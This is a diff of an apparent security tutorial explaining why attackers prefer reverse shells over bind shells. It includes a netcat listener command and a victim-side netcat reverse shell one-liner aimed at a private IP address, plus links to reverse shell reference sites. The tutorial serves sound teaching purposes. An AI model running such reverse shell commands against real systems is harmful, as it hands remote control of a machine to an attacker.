@@ -5,7 +5,7 @@ A reverse shell is an activity that all attackers are looking to utilize as an o
 
 So normally when you have a service running on a machine, like Apache or IIS, you'll have an open port on that device, like port 80. As long as the network is configured with the proper port forwarding rules and VLAN configuration, users will be able to interact with the port over the network and gain access to their favorite website. This is what we'd consider a bind shell. In other words if I open a bind shell, I'm opening a port on the victim and connecting directly to it.
 
-##### But there's a problem 
+But there's a problem...
 
 ## Reasons why we use reverse shell over bind shell
 A bind shell works great when you're directly connected to the same network that your victim is connected to. But what if this attack is happening over the internet? What if the victim is on another VLAN?
@@ -36,12 +36,14 @@ nc -nlvp 4444
 ```
 Victim:
 ```
-nc attacker_ip 4444 -e /bin/bash
+nc -e /bin/bash 192.168.122.209 4444
 ```
 #### Additional Shell Info
-https://delta.navisec.io/reverse-shell-reference/
+It's very infrequent that you'd see a machine have netcat (nc) already installed, and even more rare to see one old enough to still support -e (yeah they figured out that's malicious obviously) so you'll likely need to use another type of shell. Determining the right shell to use could be it's own walkthrough.
 
-https://www.revshells.com/
+![https://delta.navisec.io/reverse-shell-reference/](https://delta.navisec.io/reverse-shell-reference/)
+
+![https://www.revshells.com/](https://www.revshells.com/)
 
 #### Lazy upgrade way, works great on windows
 ```
